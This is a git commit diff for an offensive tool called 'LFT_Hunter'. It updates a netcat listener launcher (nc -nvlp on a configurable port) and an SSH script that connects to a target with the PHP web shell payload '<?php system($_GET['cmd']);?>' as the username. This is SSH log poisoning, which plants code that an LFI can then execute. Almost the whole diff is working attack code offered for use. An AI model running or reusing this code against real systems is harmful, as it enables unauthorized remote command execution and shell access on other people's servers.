ea6e97efeb7946c368fcdb2768b9236cb16a9f57
jac11 <jac11devel@gmail.com>
2024-10-24 01:22:45 +0300

    Add files via upload

--- Package/shell/netcat.py
+++ Package/shell/netcat.py
@@ -1,21 +1,34 @@
 #!/usr/bin/env python3
 import os
 import time
-with open (str(os.getcwd())+'/Package/Banner','r') as read:
+port  = None
+with open ('./Package/Banner','r') as read:
      print(read.read())
+try:
+     with open ('./Package/shell/.port','r') as port:
+         port = port.read().replace('\n','')  
+except Exception:
+   pass         
 info = ''
 info +='='*20+'\n'
 info +='[+] netcat listener \n'
 info +='='*30+'\n'
 info +='[!] IP   : .............| : 0.0.0.0\n'
-info +='[+] Port : .............| : 7777\n'
+if port == None:
+  info +='[+] Port : .............| : 7777\n'
+else:
+      info +='[+] Port : .............| : '+ str(port)+'\n'
 info +='='*40+'\n'
 print(info,end='')
 line = '┌──(Netcat)-[~/LFT_Hunter]\n'
-line +='└─$ \n'
-print(line)
-line1 ='nc -nvlp  7777'
+line += '└─$ '
+if  port == None :
+   line1 ='nc -nvlp  7777'
+else: 
+     line1 = f'nc -nvlp {port}'
+print(line)     
 command = os.system(line1)
+
 
    
    
--- Package/shell/ssh.py
+++ Package/shell/ssh.py
@@ -1,23 +1,21 @@
 #!/usr/bin/env python3
 import os
-with open (str(os.getcwd())+'/Package/Banner','r') as read:
+import paramiko
+import time
+with open (str(os.getcwd())+'/Banner','r') as read:
      print(read.read())
-with open('./Package/shell/.address','r') as SSHIP:
-         SSHIPH = SSHIP.readlines()         
+with open(str(os.getcwd())+'/shell/.address','r') as SSHIP:
+         SSHIPH = SSHIP.readlines()  
+username = """<?php system($_GET['cmd']);?>"""
+password = "dosamething"
+port = 22 
 try:           
-    info = ''
-    info +='='*20+'\n'
-    info +='[+]  _* SSH *_ \n'
-    info +='='*30+'\n'
-    info +='[!] IP   : .............| : '+ str(SSHIPH[-1])+'\n'
-    info +='[+] Port : .............| : 22\n'
-    info +='='*40+'\n'
-    print(info,end='')
-    line = '┌──(SSH-[~/LFT_Hunter]\n'
-    line +='└─$ \n'
-    print(line)
-    line1 ="ssh '<?php system($_GET['cmd']);?>'@"+SSHIPH[-1]
-    print(line1)
-    command = os.system(line1)
-except IndexError: 
-   exit()
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh.connect(str("".join(SSHIPH)) ,port=port, username=username, password=password)
+except Exception :
+    print()
+    print("SSh log poisoning involves injecting malicious input" )
+    time.sleep(4)
+    exit()
+
